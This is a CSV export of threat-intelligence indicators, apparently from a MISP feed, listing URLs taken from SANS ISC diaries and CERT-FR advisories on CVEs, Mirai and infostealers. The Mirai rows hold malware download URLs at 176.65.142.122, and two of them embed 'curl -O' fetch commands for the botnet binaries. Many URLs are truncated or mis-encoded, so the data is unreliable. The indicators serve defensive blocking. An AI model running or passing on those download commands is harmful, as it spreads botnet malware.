uuid,info,date,threat_level_id,analysis,orgc_uuid,orgc_name,attribute_category,attribute_type,attribute_value,to_ids,comment
2c5ce4a8-def6-4e56-8289-c662a54b5b19,"Python InfoStealer with Embedded Phishing Webserver, (Tue, May 6th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.viru,True,Extracted from: https://isc.sans.edu/diary/rss/31924
2c5ce4a8-def6-4e56-8289-c662a54b5b19,"Python InfoStealer with Embedded Phishing Webserver, (Tue, May 6th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://google.com,True,Extracted from: https://isc.sans.edu/diary/rss/31924
9b25098d-6f90-4fbf-a750-3f0d3ff3e6bf,"ISC Stormcast For Tuesday, May 6th, 2025 https://isc.sans.edu/podcastdetail/9438, (Tue, May 6th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://i,True,Extracted from: https://isc.sans.edu/diary/rss/31922
02172440-a323-4fe7-ab17-4de00ea4a85d,"""Mirai"" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,http://176.65.142.122/hiddenbin/boatnet.mip,True,Extracted from: https://isc.sans.edu/diary/rss/31920
02172440-a323-4fe7-ab17-4de00ea4a85d,"""Mirai"" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,http://176.65.142.122/hiddenbin/boatnet.arc; curl -O http://176.65.142.122/hiddenbin/boatnet.arc;cat boatnet.arc ,True,Extracted from: https://isc.sans.edu/diary/rss/31920
02172440-a323-4fe7-ab17-4de00ea4a85d,"""Mirai"" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,http://176.65.142.122/oh,True,Extracted from: https://isc.sans.edu/diary/rss/31920
02172440-a323-4fe7-ab17-4de00ea4a85d,"""Mirai"" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://nvd.ni,True,Extracted from: https://isc.sans.edu/diary/rss/31920
02172440-a323-4fe7-ab17-4de00ea4a85d,"""Mirai"" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://cyber,True,Extracted from: https://isc.sans.edu/diary/rss/31920
02172440-a323-4fe7-ab17-4de00ea4a85d,"""Mirai"" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)",2025-05-06,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,http://176.65.142.122/hiddenbin/boatnet.x86; curl -O http://176.65.142.122/hiddenbin/boatnet.x86;cat boatnet.x86 ,True,Extracted from: https://isc.sans.edu/diary/rss/31920
e3d4abe7-5520-48ee-ae5b-bbf59c069c13,"Web Scanning Sonicwall for CVE-2021-20016, (Tue, Apr 29th)",2025-04-30,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://e,True,Extracted from: https://isc.sans.edu/diary/rss/31906
e3d4abe7-5520-48ee-ae5b-bbf59c069c13,"Web Scanning Sonicwall for CVE-2021-20016, (Tue, Apr 29th)",2025-04-30,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://cow-prod-www-v3.azureweb,True,Extracted from: https://isc.sans.edu/diary/rss/31906
ec1defa4-2b06-4bfe-a160-4387fb410c26,Bulletin d'actualité CERTFR-2025-ACT-016 (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://m,True,Extracted from: https://www.cert.ssi.gouv.fr/actualite/CERTFR-2025-ACT-016/
ec1defa4-2b06-4bfe-a160-4387fb410c26,Bulletin d'actualité CERTFR-2025-ACT-016 (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://p,True,Extracted from: https://www.cert.ssi.gouv.fr/actualite/CERTFR-2025-ACT-016/
ec1defa4-2b06-4bfe-a160-4387fb410c26,Bulletin d'actualité CERTFR-2025-ACT-016 (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.tenable.com/,True,Extracted from: https://www.cert.ssi.gouv.fr/actualite/CERTFR-2025-ACT-016/
ec1defa4-2b06-4bfe-a160-4387fb410c26,Bulletin d'actualité CERTFR-2025-ACT-016 (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://moodle.org/mod/forum/di,True,Extracted from: https://www.cert.ssi.gouv.fr/actualite/CERTFR-2025-ACT-016/
ec1defa4-2b06-4bfe-a160-4387fb410c26,Bulletin d'actualité CERTFR-2025-ACT-016 (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.oracle.com/,True,Extracted from: https://www.cert.ssi.gouv.fr/actualite/CERTFR-2025-ACT-016/
ec1defa4-2b06-4bfe-a160-4387fb410c26,Bulletin d'actualité CERTFR-2025-ACT-016 (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://github.com/erlang/otp/,True,Extracted from: https://www.cert.ssi.gouv.fr/actualite/CERTFR-2025-ACT-016/
ec1defa4-2b06-4bfe-a160-4387fb410c26,Bulletin d'actualité CERTFR-2025-ACT-016 (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.ibm.com/,True,Extracted from: https://www.cert.ssi.gouv.fr/actualite/CERTFR-2025-ACT-016/
7ae3cd16-969b-48ff-b7e1-a0d0bc39c459,Multiples vulnérabilités dans Traefik (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-32431        Ge,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0341/
7ae3cd16-969b-48ff-b7e1-a0d0bc39c459,Multiples vulnérabilités dans Traefik (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://github.com/traefik/traefik/,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0341/
7ae3cd16-969b-48ff-b7e1-a0d0bc39c459,Multiples vulnérabilités dans Traefik (22 avril 2025),2025-04-22,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-22868 RÃ©fÃ©rence CVE CVE-2025-22871 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0341/
e244ccde-dab6-4006-b239-edc3ad072a87,Fin de support de Windows 10 en octobre 2025 (23 avril 2025),2025-04-23,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://learn.micro,True,Extracted from: https://www.cert.ssi.gouv.fr/actualite/CERTFR-2025-ACT-017/
d44d1604-2f97-441f-89f2-e0cf40ab7389,Vulnérabilité dans Spring Security (23 avril 2025),2025-04-23,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-22234        Ge,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0343/
220d1789-a9b6-4788-a0fe-b2c2c6295db0,Multiples vulnérabilités dans Google Chrome (23 avril 2025),2025-04-23,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://chromerelea,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0342/
61a7f958-0a9e-4561-8d55-5f15df47fa25,Multiples vulnérabilités dans Grafana (23 avril 2025),2025-04-23,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-2703 RÃ©fÃ©rence CVE CVE-2025-3260 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0344/
61a7f958-0a9e-4561-8d55-5f15df47fa25,Multiples vulnérabilités dans Grafana (23 avril 2025),2025-04-23,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://grafana.com/blog/2025/04/22/grafana-,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0344/
61a7f958-0a9e-4561-8d55-5f15df47fa25,Multiples vulnérabilités dans Grafana (23 avril 2025),2025-04-23,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-3454        Ge,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0344/
705e7607-f1a8-4f70-a368-a0a33e199032,Multiples vulnérabilités dans GitLab (24 avril 2025),2025-04-24,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-12244 RÃ©fÃ©rence CVE CVE-2025-0639 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0346/
705e7607-f1a8-4f70-a368-a0a33e199032,Multiples vulnérabilités dans GitLab (24 avril 2025),2025-04-24,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-2443        Ge,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0346/
705e7607-f1a8-4f70-a368-a0a33e199032,Multiples vulnérabilités dans GitLab (24 avril 2025),2025-04-24,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-1763 RÃ©fÃ©rence CVE CVE-2025-1908 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0346/
705e7607-f1a8-4f70-a368-a0a33e199032,Multiples vulnérabilités dans GitLab (24 avril 2025),2025-04-24,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://about.gitlab.com/relea,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0346/
0638a2ee-3db0-4d16-968f-00c7f163b5be,Vulnérabilité dans Sophos Taegis Endpoint Agent (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0347/
0638a2ee-3db0-4d16-968f-00c7f163b5be,Vulnérabilité dans Sophos Taegis Endpoint Agent (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-13861        Ge,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0347/
4bb8743a-f578-43d7-8017-24b2cb3a7a60,Vulnérabilité dans SAP NetWeaver (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://cert.,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0350/
4bb8743a-f578-43d7-8017-24b2cb3a7a60,Vulnérabilité dans SAP NetWeaver (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-31324        Ge,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0350/
4bb8743a-f578-43d7-8017-24b2cb3a7a60,Vulnérabilité dans SAP NetWeaver (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://me.,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0350/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-53109 RÃ©fÃ©rence CVE CVE-2024-53110 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-53171 RÃ©fÃ©rence CVE CVE-2024-53172 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50019 RÃ©fÃ©rence CVE CVE-2024-50020 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50158 RÃ©fÃ©rence CVE CVE-2024-50159 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-53066 RÃ©fÃ©rence CVE CVE-2024-53067 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-56540 RÃ©fÃ©rence CVE CVE-2024-56543 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50273 RÃ©fÃ©rence CVE CVE-2024-50274 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50135 RÃ©fÃ©rence CVE CVE-2024-50136 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-53105 RÃ©fÃ©rence CVE CVE-2024-53106 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2022-0995 RÃ©fÃ©rence CVE CVE-2022-49034 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50073 RÃ©fÃ©rence CVE CVE-2024-50074 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50294 RÃ©fÃ©rence CVE CVE-2024-50295 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50191 RÃ©fÃ©rence CVE CVE-2024-50192 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-56574 RÃ©fÃ©rence CVE CVE-2024-56575 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-56592 RÃ©fÃ©rence CVE CVE-2024-56593 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-56623 RÃ©fÃ©rence CVE CVE-2024-56625 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-53107 RÃ©fÃ©rence CVE CVE-2024-53108 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50221 RÃ©fÃ©rence CVE CVE-2024-50222 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50267 RÃ©fÃ©rence CVE CVE-2024-50268 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-56787 RÃ©fÃ©rence CVE CVE-2024-57791 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-56705 RÃ©fÃ©rence CVE CVE-2024-56707 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-57843 RÃ©fÃ©rence CVE CVE-2024-57849 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-56604 RÃ©fÃ©rence CVE CVE-2024-56605 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-49865 RÃ©fÃ©rence CVE CVE-2024-49884 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-57903 RÃ©fÃ©rence CVE CVE-2024-57904 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50048 RÃ©fÃ©rence CVE CVE-2024-50049 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2025-21831 RÃ©fÃ©rence CVE CVE-2025-21993 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50155 RÃ©fÃ©rence CVE CVE-2024-50156 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
f8210504-e584-450d-b139-185a61831922,Multiples vulnérabilités dans le noyau Linux d'Ubuntu (25 avril 2025),2025-04-25,4,0,926e159d-1b41-4069-995e-b8eae5d338f9,ADMIN,External analysis,url,https://www.cve.org/CVERecord?id=CVE-2024-50283 RÃ©fÃ©rence CVE CVE-2024-50284 http,True,Extracted from: https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0349/
